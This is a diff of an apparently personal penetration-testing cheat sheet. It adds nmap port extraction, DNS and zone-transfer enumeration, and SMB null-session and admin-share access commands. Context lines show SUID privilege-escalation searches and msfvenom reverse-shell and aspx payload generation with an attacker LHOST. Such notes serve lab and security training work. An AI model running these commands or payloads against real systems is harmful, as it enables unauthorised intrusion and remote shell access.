@@ -14,12 +14,33 @@
   - sudo nmap -p- -Pn -sS TARGET -oA AllPort
   - sudo nmap -p -Pn -A 10.10.43.161 -oA Services
   - sudo nmap -Pn -sV -sS -p --script vuln $target -oN Vuln.txt
-  - **smb**
     - sudo nmap -p445 --script=smb-enum-shares.nse,smb-enum-users.nse $target
   - -v Version
   - -A os, in-build scripts
   - -sC default scripts
-  - extract ports:  egrep "^[0-9]{2,5}*" adnotes.md | sed -E "s#/.*##g" 
+  - **extract ports**: sudo nmap -Pn -p- -T4 $target -oN ports.txt | egrep "^[0-9]{2,5}"  | sed -E "s#/.*##g" | tr "\n" ","
+    -  ports=$(sudo nmap -Pn -T4 $target -oN ports.txt | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $ports
+
+### DNS
+- Port 53 UDP/TCP
+  - -sU UDP
+  - TCP: zone transfer
+  - add entry to etc/hosts
+    -  echo "$target      domain" | sudo tee -a /etc/hosts
+ - remove entry
+  -  sudo sed -i "/$target      domain/d" /etc/hosts
+  
+- dig $target +short
+  - dig $target -t RECORD +short
+  - dig axfr domain @ATTACKING
+- host $target
+  - host -t ns $target
+- dnsenum
+- nmap
+  -  nmap -T4 -p53 --script dns* $target
+- fierce --domain domain
+- dnsrecon -d DOMAIN -std
+
 
 - nmap Scrips
   - locate -r nse$ | grep mysql = nmap script
@@ -47,7 +68,24 @@
   - icalcs
 - eventvwr
 - RCE admin: change user
-  
+
+### SMB
+- smbmap -H $target = Check Privileges 
+- smbmap -H $target -R --depth 5
+- smbclient -L //$target/ = List Shares
+- smbclient //$target/Users = Interactive shell to a share 
+- smbclient  \\\\$target\\share$ = Open a Null Session
+- smbclient //friendzone.htb/general -U "" = see files inside
+- smbclient -N -L //$target/ = List Shares as Null User
+- smbmap -u Administrator -p 'Password@1' -H $target
+- smbclient -U 'administrator%Password@1' \\\\\$target\\c$
+- Nmap scripts
+  - smb-enum-users.nse
+  - smb-os-discovery
+  - smb-protocols
+  - smb-enum-shares
+  - smb-vuln*
+
 ## Linux
 - sudo -l
 - find / -perm -u=s -type f 2>/dev/null
@@ -127,9 +165,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=80 EXITFUNC=thread 
 ```
 ## Convert python
 dos2unix file
+
 ## Pictures
 - strings
 - exiftool
+- 
 ## Payloads
 - msfvenom - reverse -f aspx -o app.aspx
 - -e x86/shikata_ga_nai
